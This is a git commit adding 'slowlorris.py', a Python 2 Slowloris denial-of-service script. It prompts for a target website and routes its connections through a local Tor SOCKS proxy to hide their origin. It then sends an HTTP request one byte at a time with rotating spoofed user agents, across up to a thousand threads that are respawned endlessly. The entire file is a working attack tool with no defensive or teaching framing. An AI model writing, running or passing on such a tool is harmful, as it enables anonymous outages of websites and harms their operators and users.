f131c7ea5dac1e6f62f524be75ea075b07a22147
itachi uchiha <34375227+itachiu@users.noreply.github.com>
2018-06-21 14:16:58 +0000

    Add files via upload

---
+++ slowlorris.py
@@ -0,0 +1,98 @@
+import socket
+import time
+import threading
+import random
+
+adress = (str(raw_input('enter the website address: ')))
+ipadress = socket.gethostbyname(adress)
+requests1 = '''GET /dumprequest HTTP/1.1\r\n'''
+host = 'Host: '+ ipadress+'\r\nUser_Agent: '
+requests2 = '''\r\nAccept: text/html,application/xhtml+xml\r\n,application/xml;q=0.9,*/*;q=0.8\r\n
+Accept-Language: en-US,en;q=0.5\r\n
+Referer: https://duckduckgo.com\r\n
+DNT: 1\r\n
+Connection: keep-alive\r\n
+'''
+useragents = [
+    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0',
+    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/57.0',
+    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/59.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+    'Mozilla/5.0 (Unknown; Linux) AppleWebKit/538.1 (KHTML, like Gecko) Chrome/v1.0.0 Safari/538.1',
+    'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
+    'Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62',
+    'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
+    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
+    'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
+    'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',
+    'Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0',
+    'Mozilla/5.0 (Windows NT x.y; rv:10.0) Gecko/20100101 Firefox/10.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0',
+    'Mozilla/5.0 (Macintosh; PPC Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0',
+    'Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0',
+    'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0',
+    'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
+    'Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0',
+    'Mozilla/5.0 (TV; rv:44.0) Gecko/44.0 Firefox/44.0',
+    'Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0',
+    'Mozilla/5.0 (iPod touch; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4',
+    'Mozilla/5.0 (iPad; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4',
+    ]
+ip = ipadress.split('.')
+adr = ''
+for i in ip:
+	adr1 = (hex(int(i)))
+	adr += '\\'+adr1[1:]
+enc_t = adr.encode('utf_8')
+adr = enc_t.decode('unicode_escape')
+#print adr	
+
+def sockets():
+#	print '[+] socket function started'
+        try:
+    
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                sock.connect(('127.0.0.1',9050))
+		print '[+] Connection made'
+		#response = sock.recv(100)
+		#print response
+		#if response is '\x50\x00':
+		re = ('\x04\x01\x00\x50'+adr+'\x00')
+		sock.send(re)
+		print re
+		response = sock.recv(4096)
+		print response
+                requests = (requests1+host+str(random.choice(useragents))+requests2)
+                for i in range(len(requests)):
+                    sock.send(requests[i])
+                    time.sleep(0.5)
+                print ('[+] sent the request')
+        finally:return
+
+'''def ip_hex(ipad):
+	ip = ipad.split('.')
+	adr = ''
+	for i in ip:
+		adr += (hex(int(i)))
+	#print adr	
+	return adr'''
+
+
+#sockets()
+for i in range(1000):
+	threading.Thread(target=sockets).start()
+	print ('[+] Thread '+str(i)+' created')
+	time.sleep(10)
+
+while True:
+    if (threading.activeCount() < 998 ):
+        threading.Thread(target=sockets).start()
+        print ('[+] New Thread Created')
+
+
+
